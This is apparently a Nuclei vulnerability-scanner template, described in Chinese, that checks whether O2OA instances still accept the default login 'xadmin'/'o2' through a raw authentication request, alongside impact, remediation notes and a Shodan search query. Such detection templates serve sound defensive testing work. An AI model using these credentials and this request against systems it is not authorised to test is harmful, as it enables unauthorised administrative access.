id: o2oa-default-login

info:
  name: O2OA 默认口令登录（弱口令）
  author: SleepingBag945
  severity: high
  description: |
    该模板用于检测 O2OA 是否仍可使用默认凭据或弱口令登录。模板主要向 `/x_organization_assemble_authentication/jaxrs/authentication/captcha` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据响应中的 `"type": "success"`、`distinguishedName` 等登录成功特征判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可登录 O2OA 后台，管理内容、用户、插件、主题、文件、表单或业务流程配置。
    - 后台权限被滥用后，可能导致页面篡改、恶意文件上传、敏感资料泄露，或进一步取得服务器执行能力。
  remediation: |
    - 立即修改默认管理员凭据，删除安装向导、演示账号和不必要的后台用户。
    - 限制后台登录入口访问来源，启用多因素认证、登录失败锁定和验证码等防护。
    - 检查近期内容、插件、主题、文件上传和管理员操作记录，确认没有持久化后门。
  classification:
    cpe: cpe:2.3:a:zoneland:o2oa:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: zoneland
    product: o2oa
    shodan-query: title=="O2OA"
  tags: o2oa,default-login,vuln

http:
  - raw:
      - |
        POST /x_organization_assemble_authentication/jaxrs/authentication/captcha HTTP/1.1
        Host: {{Hostname}}
        Cookie: x-token=anonymous
        Authorization: anonymous
        Accept: text/html,application/json,*/*
        Content-Type: application/json; charset=UTF-8

        {"credential":"{{username}}","password":"{{password}}"}

    payloads:
      username:
        - 'xadmin'
      password:
        - 'o2'
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\"type\": \"success\""
          - "distinguishedName"
        condition: and

      - type: word
        part: header
        words:
          - "application/json"

      - type: status
        status:
          - 200
